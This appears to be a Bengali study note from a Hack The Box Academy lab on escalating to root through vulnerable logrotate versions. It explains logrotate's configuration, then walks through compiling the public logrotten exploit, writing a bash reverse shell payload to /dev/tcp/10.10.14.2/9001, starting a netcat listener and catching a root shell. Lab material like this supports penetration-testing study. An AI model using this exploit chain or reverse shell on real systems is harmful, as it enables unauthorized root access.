# Logrotate - [LINK](https://academy.hackthebox.com/app/module/51/section/1589)


লিনাক্স সিস্টেমে লগ ফাইল ম্যানেজ করার একটি অত্যন্ত প্রয়োজনীয় টুল হলো **logrotate**। সিস্টেমে অ্যাক্সেস পাওয়ার পর, যদি দেখা যায় যে এই টুলের কোনো দুর্বল ভার্সন চলছে এবং নির্দিষ্ট কিছু কনফিগারেশন ভুল আছে, তবে আমরা খুব সহজেই সিস্টেমের রুট (Root) অ্যাক্সেস বা প্রিভিলেজ এসকালেশন করতে পারি।

চলুন পুরো কনসেপ্টটি একদম সহজ ভাষায় ধাপে ধাপে বুঝে নিই।

## ১. Logrotate কী এবং কেন ব্যবহার করা হয়?

যেকোনো লিনাক্স সিস্টেমে প্রতিনিয়ত প্রচুর পরিমাণে লগ (Log) ফাইল তৈরি হতে থাকে (যেমন: এরর লগ, সার্ভিস লগ ইত্যাদি)। যদি এই লগ ফাইলগুলো দিনের পর দিন জমতে থাকে, তবে একসময় হার্ডডিস্ক ফুল হয়ে যাবে। এছাড়াও, বড় লগ ফাইলের ভেতর থেকে কোনো তথ্য খুঁজে বের করা অনেক সময়ের ব্যাপার।

এই সমস্যা সমাধানের জন্যই `logrotate` তৈরি করা হয়েছে। এর কাজ হলো পুরোনো লগ ফাইলগুলোকে আর্কাইভ করা, রিনেম করা, কম্প্রেস করা বা ডিলিট করে দেওয়া। এর ফলে হার্ডডিস্কের জায়গা বেঁচে যায়।

লগরোটেট মূলত তিনটি বিষয়ের ওপর ভিত্তি করে কাজ করে:

* লগ ফাইলের সাইজ (Size)
* লগ ফাইলের বয়স (Age)
* এই শর্তগুলো পূরণ হলে কী কাজ (Action) করতে হবে।

## ২. Logrotate এর কনফিগারেশন এবং ব্যবহার

লগরোটেট কীভাবে কাজ করবে, তা মূলত `/etc/logrotate.conf` ফাইলে কনফিগার করা থাকে। এটি হলো গ্লোবাল কনফিগারেশন ফাইল।

**কনফিগারেশন ফাইল দেখা:**

```bash
00Luffy00@htb[/htb]$ cat /etc/logrotate.conf

```

এই ফাইলের ভেতরে কিছু সাধারণ কমান্ড থাকে, যেমন:

* `weekly`: প্রতি সপ্তাহে লগ রোটেট করবে।
* `rotate 4`: ৪ সপ্তাহের পুরোনো লগগুলো জমিয়ে রাখবে।
* `create`: পুরোনো লগ ফাইল রিনেম বা সরানোর পর নতুন একটি ফাঁকা লগ ফাইল তৈরি করবে।
* `compress`: জায়গা বাঁচানোর জন্য লগ ফাইলগুলো জিপ বা কম্প্রেস করে রাখবে।

বিভিন্ন সার্ভিসের (যেমন: dpkg, apt, mysql) জন্য আলাদা আলাদা কনফিগারেশন ফাইল `/etc/logrotate.d/` ডিরেক্টরিতে থাকে।

**লগ রোটেশন ফোর্স করা:**
লগরোটেট সাধারণত ক্রন জবের (Cron job) মাধ্যমে অটোমেটিক চলে। কিন্তু আমরা চাইলে `-f` বা `--force` অপশন ব্যবহার করে অথবা `/var/lib/logrotate.status` ফাইলের তারিখ পরিবর্তন করে জোরপূর্বক (force) লগ রোটেট করাতে পারি।

## ৩. হ্যাকিংয়ের শর্তসমূহ (Requirements for Exploitation)

লগরোটেট ব্যবহার করে প্রিভিলেজ এসকালেশন করার জন্য আমাদের তিনটি শর্ত পূরণ করতে হবে:

১. **রাইট পারমিশন (Write Permissions):** টার্গেট লগ ফাইলে আমাদের (বর্তমান ইউজারের) কিছু লেখার বা এডিট করার পারমিশন থাকতে হবে।
২. **প্রিভিলেজড রান (Privileged Run):** লগরোটেট প্রোগ্রামটি অবশ্যই রুট (root) বা কোনো প্রিভিলেজড ইউজার দ্বারা রান হতে হবে।
৩. **দুর্বল ভার্সন (Vulnerable Versions):** সিস্টেমটিতে লগরোটেটের নিচের যেকোনো একটি ভার্সন চলতে হবে:

* 3.8.6
* 3.11.0
* 3.15.0
* 3.18.0

## ৪. Logrotten দিয়ে রুট অ্যাক্সেস নেওয়া (Exploitation Steps)

যদি উপরের শর্তগুলো মিলে যায়, তবে আমরা **logrotten** নামের একটি আগে থেকে তৈরি করা এক্সপ্লয়ট ব্যবহার করে সিস্টেম হ্যাক করতে পারি।

**ধাপ ১: Logrotten ডাউনলোড এবং কম্পাইল করা**
প্রথমে গিটহাব থেকে এক্সপ্লয়টটি ডাউনলোড করতে হবে এবং `gcc` ব্যবহার করে কম্পাইল করতে হবে। (এটি টার্গেট সিস্টেমে বা একই রকম কার্নেল আছে এমন কোনো সিস্টেমে করতে হবে)।

```bash
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten

```

**ধাপ ২: পেলোড (Payload) তৈরি করা**
আমাদের এমন একটি কমান্ড লাগবে যা রুট পারমিশন নিয়ে রান হবে। এখানে আমরা একটি সিম্পল ব্যাশ রিভার্স শেল (Bash Reverse Shell) ব্যবহার করছি, যা আমাদের অ্যাটাকিং মেশিনে (যেমন 10.10.14.2 আইপি এবং 9001 পোর্টে) কানেকশন পাঠাবে।

```bash
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

```

**ধাপ ৩: লগরোটেটের অপশন চেক করা**
অ্যাটাক চালানোর আগে আমাদের জানতে হবে লগরোটেট কী মুডে কাজ করছে (`create` নাকি `compress`)।

```bash
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create

```

আউটপুট দেখাচ্ছে `create`। অর্থাৎ, লগরোটেট ফাইল রোটেট করার পর নতুন ফাইল "তৈরি" করে। আমাদের এক্সপ্লয়টটি এই তথ্যের ওপর ভিত্তি করেই কাজ করবে।

**ধাপ ৪: লিসেনার (Listener) চালু করা**
আমাদের অ্যাটাকিং মেশিনে (বা Pwnbox এ) netcat দিয়ে ৯০০১ পোর্টে একটি লিসেনার চালু করতে হবে, যেন টার্গেট মেশিন থেকে কানেকশন আসলে আমরা তা ধরতে পারি।

```bash
00Luffy00@htb[/htb]$ nc -nlvp 9001
Listening on 0.0.0.0 9001

```

**ধাপ ৫: অ্যাটাক এক্সিকিউট করা**
সবশেষে, আমরা কম্পাইল করা `logrotten` ফাইলটি রান করব। এর সাথে আমাদের তৈরি করা `payload` এবং যে লগ ফাইলে আমাদের রাইট পারমিশন আছে (যেমন `/tmp/tmp.log`), সেটি দেখিয়ে দেব।

```bash
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log

```

যখনই ব্যাকগ্রাউন্ডে লগরোটেট রান হবে এবং ওই লগ ফাইলটি রোটেট করার চেষ্টা করবে, তখন আমাদের এক্সপ্লয়টটি ট্রিগার হবে। সাথে সাথেই লিসেনারে রুট শেল চলে আসবে!

```bash
Connection received on 10.129.24.11 49818
# id
uid=0(root) gid=0(root) groups=0(root)

```

সফলভাবে আমরা সিস্টেমের রুট অ্যাক্সেস পেয়ে গেছি।
